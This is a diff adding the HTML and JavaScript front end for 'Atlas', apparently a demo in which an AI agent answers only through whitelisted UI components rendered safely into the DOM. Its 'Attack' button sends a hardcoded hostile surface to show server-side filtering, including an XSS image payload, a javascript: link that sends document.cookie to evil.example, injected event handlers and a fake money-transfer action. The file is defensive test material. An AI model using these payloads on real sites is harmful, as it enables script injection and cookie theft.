@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Atlas</title>
+<style>
+  :root{
+    --bg:oklch(97.4% .004 250); --panel:oklch(99% .002 250); --sunk:oklch(94.6% .005 250);
+    --ink:oklch(20% .012 250); --ink2:oklch(46% .010 250); --ink3:oklch(62% .008 250);
+    --rule:oklch(87% .006 250); --acc:oklch(45% .150 252); --good:oklch(46% .120 155);
+    --warn:oklch(55% .140 70); --bad:oklch(48% .180 27);
+    --fs:ui-sans-serif,system-ui,"Segoe UI",sans-serif;
+    --fm:ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+  }
+  @media(prefers-color-scheme:dark){:root{
+    --bg:oklch(18% .012 250); --panel:oklch(21% .013 250); --sunk:oklch(24% .014 250);
+    --ink:oklch(93% .006 250); --ink2:oklch(71% .008 250); --ink3:oklch(55% .008 250);
+    --rule:oklch(31% .012 250); --acc:oklch(73% .120 250); --good:oklch(74% .130 155);
+    --warn:oklch(78% .130 75); --bad:oklch(70% .150 30);
+  }}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--fs);font-size:15px;line-height:1.5}
+  header{border-bottom:1px solid var(--rule);padding:14px 20px;display:flex;gap:14px;align-items:baseline;flex-wrap:wrap}
+  header b{font-size:15px;letter-spacing:-.01em}
+  header .sub{color:var(--ink3);font-size:12px;font-family:var(--fm)}
+  header .st{margin-left:auto;font-family:var(--fm);font-size:11px;color:var(--ink3)}
+  main{max-width:900px;margin:0 auto;padding:20px}
+  .turn{margin-bottom:26px}
+  .ask{font-family:var(--fm);font-size:12px;color:var(--ink3);margin-bottom:8px}
+  .ask b{color:var(--ink2);font-weight:600}
+  .meta{font-family:var(--fm);font-size:11px;color:var(--ink3);margin-top:8px}
+  .rej{border:1px solid var(--bad);padding:8px 10px;margin-top:8px;font-family:var(--fm);font-size:11.5px;color:var(--bad)}
+  form{position:sticky;bottom:0;background:var(--bg);border-top:1px solid var(--rule);padding:12px 20px;display:flex;gap:10px;max-width:900px;margin:0 auto}
+  input{flex:1;padding:10px 12px;border:1px solid var(--rule);background:var(--panel);color:var(--ink);font:inherit}
+  button.send{padding:10px 16px;border:1px solid var(--ink);background:var(--ink);color:var(--bg);font:inherit;cursor:pointer}
+  button.atk{padding:10px 14px;border:1px solid var(--bad);background:transparent;color:var(--bad);font:inherit;cursor:pointer;font-size:13px}
+  input:disabled,button:disabled{opacity:.5}
+  /* components */
+  .Column{display:flex;flex-direction:column;gap:12px}
+  .Row{display:flex;gap:12px;flex-wrap:wrap;align-items:stretch}
+  .Row>*{flex:1;min-width:150px}
+  .Heading{font-size:19px;font-weight:640;letter-spacing:-.02em}
+  .Text{color:var(--ink2)}
+  .panel{background:var(--panel);border:1px solid var(--rule);padding:12px 14px}
+  .Notice{padding:10px 12px;border:1px solid var(--rule);background:var(--sunk);font-size:14px}
+  .Notice.good{border-color:var(--good);color:var(--good)}
+  .Notice.warn{border-color:var(--warn);color:var(--warn)}
+  .Notice.bad{border-color:var(--bad);color:var(--bad)}
+  .lab{font-family:var(--fm);font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3)}
+  .val{font-size:26px;font-weight:600;letter-spacing:-.02em;font-variant-numeric:tabular-nums}
+  table{border-collapse:collapse;width:100%;font-size:13.5px}
+  th,td{text-align:left;padding:6px 10px 6px 0;border-bottom:1px solid var(--rule);vertical-align:top}
+  th{font-family:var(--fm);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--ink3)}
+  td{font-variant-numeric:tabular-nums}
+  .bar{display:flex;align-items:center;gap:10px;font-size:13px;margin:3px 0}
+  .bar .n{width:110px;color:var(--ink2);flex:none}
+  .bar .t{height:12px;background:var(--acc)}
+  .bar .v{font-family:var(--fm);font-size:11.5px;color:var(--ink3);font-variant-numeric:tabular-nums}
+  .tl{display:flex;gap:10px;font-size:13.5px;padding:3px 0}
+  .tl .d{color:var(--acc);flex:none}
+  .ck{display:flex;gap:9px;font-size:13.5px;padding:3px 0}
+  .kv{display:grid;grid-template-columns:auto 1fr;gap:4px 16px;font-size:13.5px}
+  .kv .k{color:var(--ink3);font-family:var(--fm);font-size:12px}
+  .chip{font-family:var(--fm);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;padding:2px 7px;border:1px solid var(--rule)}
+  .src{font-size:12px;color:var(--ink3);margin-top:7px;display:flex;flex-wrap:wrap;gap:5px 12px}
+  .src a{color:var(--acc)}
+  .act{display:flex;gap:8px;flex-wrap:wrap}
+  .act button{padding:7px 13px;border:1px solid var(--rule);background:var(--panel);color:var(--ink);font:inherit;font-size:13.5px;cursor:pointer}
+  .act button:hover{border-color:var(--acc);color:var(--acc)}
+</style>
+</head>
+<body>
+<header>
+  <b>Atlas</b>
+  <span class="sub">the agent may only answer in interfaces</span>
+  <span class="st" id="st">connecting…</span>
+</header>
+<main id="feed"></main>
+<form id="f">
+  <input id="q" autocomplete="off" placeholder="Ask something with shape: compare, track, plan, summarise with sources…">
+  <button class="send" type="submit">Compose</button>
+  <button class="atk" type="button" id="atk" title="Render a hostile surface through the same wall">Attack</button>
+</form>
+
+<script>
+const feed=document.getElementById("feed"), f=document.getElementById("f"),
+      q=document.getElementById("q"), st=document.getElementById("st");
+const history=[];
+const E=(t,c)=>{const e=document.createElement(t);if(c)e.className=c;return e;};
+const T=v=>document.createTextNode(v==null?"":String(v));
+const asArr=v=>Array.isArray(v)?v:(v==null?[]:[v]);
+
+// Renderers. Every one builds DOM. innerHTML appears nowhere in this file.
+const R={
+  Column:(c,x)=>{const e=E("div","Column");asArr(c.children).forEach(id=>{const k=x[id];if(k)e.append(node(k,x));});return e;},
+  Row:(c,x)=>{const e=E("div","Row");asArr(c.children).forEach(id=>{const k=x[id];if(k)e.append(node(k,x));});return e;},
+  Heading:c=>{const e=E("div","Heading");e.append(T(c.text));return e;},
+  Text:c=>{const e=E("div","Text");e.append(T(c.text));return e;},
+  Notice:c=>{const e=E("div","Notice "+(c.tone||"neutral"));e.append(T(c.text));return e;},
+  StatTile:c=>{const e=E("div","panel");const l=E("div","lab");l.append(T(c.label));
+    const v=E("div","val");v.append(T(String(c.value)+(c.unit?" "+c.unit:"")));e.append(l,v);return e;},
+  KeyValue:c=>{const e=E("div","panel");const g=E("div","kv");
+    asArr(c.pairs).forEach(p=>{const k=E("div","k");k.append(T(p.key!=null?p.key:p.k));
+      const v=E("div");v.append(T(p.value!=null?p.value:p.v));g.append(k,v);});e.append(g);return e;},
+  DataTable:c=>{const e=E("div","panel");const rows=asArr(c.rows);
+    // Models describe columns three ways: "a,b", ["a","b"], [{name:"a"}].
+    // A renderer that only accepts one of them looks broken for no good reason.
+    let cols=[];
+    if(Array.isArray(c.columns))cols=c.columns.map(x=>typeof x==="object"&&x?(x.name||x.label||x.key||""):String(x));
+    else if(typeof c.columns==="string"&&c.columns.trim())cols=c.columns.split(",").map(s=>s.trim());
+    if(!cols.length&&rows[0])cols=Object.keys(rows[0]);
+    const t=E("table");const hr=E("tr");cols.forEach(h=>{const th=E("th");th.append(T(h));hr.append(th);});
+    t.append(hr);rows.forEach(r=>{const tr=E("tr");cols.forEach(h=>{const td=E("td");td.append(T(r[h]));tr.append(td);});t.append(tr);});
+    e.append(t);return e;},
+  BarChart:c=>{const e=E("div","panel");if(c.title){const h=E("div","lab");h.append(T(c.title));e.append(h);}
+    const d=asArr(c.data);const mx=Math.max(...d.map(r=>+(r.value!=null?r.value:r.v)||0),1);
+    d.forEach(r=>{const v=+(r.value!=null?r.value:r.v)||0;const row=E("div","bar");
+      const n=E("span","n");n.append(T(r.label!=null?r.label:r.name));
+      const t=E("span","t");t.style.width=Math.max(2,v/mx*100)+"%";
+      const s=E("span","v");s.append(T(v));row.append(n,t,s);e.append(row);});return e;},
+  Sparkline:c=>{const e=E("div","panel");const d=asArr(c.data).map(Number).filter(n=>!isNaN(n));
+    const ns="http://www.w3.org/2000/svg",w=280,h=42,mx=Math.max(...d,1),mn=Math.min(...d,0),rg=(mx-mn)||1;
+    const s=document.createElementNS(ns,"svg");s.setAttribute("viewBox",`0 0 ${w} ${h}`);s.setAttribute("width","100%");
+    const p=document.createElementNS(ns,"polyline");
+    p.setAttribute("points",d.map((y,i)=>`${i/(d.length-1||1)*w},${h-4-(y-mn)/rg*(h-8)}`).join(" "));
+    p.setAttribute("fill","none");p.setAttribute("stroke","currentColor");p.setAttribute("stroke-width","2");
+    s.style.color="var(--acc)";s.append(p);e.append(s);return e;},
+  Timeline:c=>{const e=E("div","panel");if(c.title){const h=E("div","lab");h.append(T(c.title));e.append(h);}
+    asArr(c.events).forEach(ev=>{const r=E("div","tl");const d=E("span","d");d.append(T("●"));
+      const l=E("span");l.append(T(ev.label!=null?ev.label:(ev.text!=null?ev.text:JSON.stringify(ev))));
+      r.append(d,l);e.append(r);});return e;},
+  Checklist:c=>{const e=E("div","panel");if(c.title){const h=E("div","lab");h.append(T(c.title));e.append(h);}
+    asArr(c.items).forEach(it=>{const r=E("div","ck");const b=E("span");
+      const done=(it&&it.done)===true;b.append(T(done?"■":"□"));
+      const l=E("span");l.append(T(it&&it.label!=null?it.label:it));r.append(b,l);e.append(r);});return e;},
+  EvidenceCard:c=>{const e=E("div","panel");
+    const head=E("div");head.style.cssText="display:flex;gap:8px;align-items:center;margin-bottom:6px";
+    const chip=E("span","chip");chip.append(T(c.stance||"stated"));
+    chip.style.color=c.stance==="stated"?"var(--good)":c.stance==="derived"?"var(--acc)":"var(--ink3)";
+    head.append(chip);
+    const cl=E("div");cl.append(T(c.claim));
+    const sr=E("div","src");
+    asArr(c.sources).forEach(s=>{const uri=String(s&&s.uri||""),lab=String(s&&s.label||uri);
+      if(/^(https?|mailto):/i.test(uri)){const a=document.createElement("a");
+        a.href=uri;a.rel="noopener noreferrer";a.target="_blank";a.append(T(lab));sr.append(a);}
+      else{const sp=E("span");sp.append(T(lab+" ("+uri+")"));sr.append(sp);}});
+    e.append(head,cl,sr);return e;},
+  Choice:c=>{const e=E("div","act");asArr(c.options).forEach(o=>{const b=E("button");
+    const lab=String(o&&typeof o==="object"?(o.label!=null?o.label:(o.text!=null?o.text:(o.name!=null?o.name:JSON.stringify(o)))):o);
+    b.append(T(lab));b.onclick=()=>ask(lab);e.append(b);});return e;},
+  Button:c=>{const e=E("div","act");const b=E("button");b.append(T(c.label));
+    b.onclick=()=>ask(c.label);e.append(b);return e;}
+};
+
+function node(c,x){const r=R[c.type];if(!r){const d=E("div","Notice bad");d.append(T("no renderer for "+c.type));return d;}return r(c,x);}
+
+function draw(surface,into){
+  const x={};(surface.components||[]).forEach(c=>x[c.id]=c);
+  const root=x[surface.root]||(surface.components||[])[0];
+  if(root)into.append(node(root,x));
+  // orphans: components the model built but never referenced from root
+  const seen=new Set();(function walk(c){if(!c||seen.has(c.id))return;seen.add(c.id);
+    asArr(c.children).forEach(id=>walk(x[id]));})(root);
+  (surface.components||[]).forEach(c=>{if(!seen.has(c.id))into.append(node(c,x));});
+}
+
+async function ask(prompt){
+  if(!prompt.trim())return;
+  q.value="";q.disabled=true;
+  const t=E("div","turn");
+  const a=E("div","ask");a.append(T("you asked  "));const b=E("b");b.append(T(prompt));a.append(b);
+  t.append(a);const slot=E("div");const wait=E("div","Text");wait.append(T("composing an interface…"));
+  slot.append(wait);t.append(slot);feed.append(t);window.scrollTo(0,document.body.scrollHeight);
+  try{
+    const r=await fetch("/turn",{method:"POST",headers:{"content-type":"application/json"},
+      body:JSON.stringify({prompt,history})});
+    const d=await r.json();
+    slot.textContent="";
+    if(d.error){const n=E("div","Notice bad");n.append(T(d.error+": "+(d.detail||"")));slot.append(n);}
+    else{
+      draw(d.surface,slot);
+      const m=E("div","meta");
+      m.append(T(`${d.provider||"?"} · ${d.model||"?"} · ${(d.component_types||[]).join(" ")}`));
+      slot.append(m);
+      if(d.rejections&&d.rejections.length){
+        const rj=E("div","rej");
+        rj.append(T("wall refused "+d.rejections.length+" component(s): "+
+          d.rejections.map(x=>`${x.id}.${x.field} [${x.invariant}] ${x.reason}`).join("  |  ")));
+        slot.append(rj);
+      }
+      history.push(prompt);
+    }
+  }catch(e){slot.textContent="";const n=E("div","Notice bad");n.append(T(String(e)));slot.append(n);}
+  q.disabled=false;q.focus();window.scrollTo(0,document.body.scrollHeight);
+}
+
+f.addEventListener("submit",e=>{e.preventDefault();ask(q.value);});
+
+// The adversarial button: a hostile surface, rendered through the same wall.
+document.getElementById("atk").addEventListener("click",()=>{
+  const t=E("div","turn");
+  const a=E("div","ask");a.append(T("adversarial  "));const b=E("b");
+  b.append(T("a surface carrying markup, a script url, a handler and an unregistered action"));
+  a.append(b);t.append(a);
+  const slot=E("div");
+  fetch("/turn_raw",{method:"POST",headers:{"content-type":"application/json"},
+    body:JSON.stringify({surface:{root:"c",components:[
+      {id:"c",type:"Column",children:["ok","m","u","h","x","e"]},
+      {id:"ok",type:"Heading",text:"This heading is legitimate and survives"},
+      {id:"m",type:"Text",text:"<img src=x onerror=alert(document.cookie)>"},
+      {id:"u",type:"EvidenceCard",claim:"Sourced claim",stance:"inferred",
+       sources:[{uri:"javascript:fetch('https://evil.example/'+document.cookie)",label:"Source [1]"}]},
+      {id:"h",type:"Text",text:"fine",onclick:"steal()"},
+      {id:"x",type:"Button",label:"Wire money",onPress:{action:"transfer_funds"}},
+      {id:"e",type:"RawHtml",html:"<script>alert(1)<\/script>"}
+    ]}})
+  }).then(r=>r.json()).then(d=>{
+    draw(d.surface,slot);
+    const rj=E("div","rej");
+    rj.append(T("wall refused "+d.rejections.length+": "+
+      d.rejections.map(x=>`${x.id}.${x.field} [${x.invariant}] ${x.reason}`).join("  |  ")));
+    slot.append(rj);
+  });
+  t.append(slot);feed.append(t);window.scrollTo(0,document.body.scrollHeight);
+});
+
+fetch("/healthz").then(r=>r.json()).then(d=>{
+  st.textContent = d.ok ? `gateway ok · ${d.provider}` : "gateway unreachable";
+}).catch(()=>{st.textContent="gateway unreachable";});
+q.focus();
+</script>
+</body>
+</html>
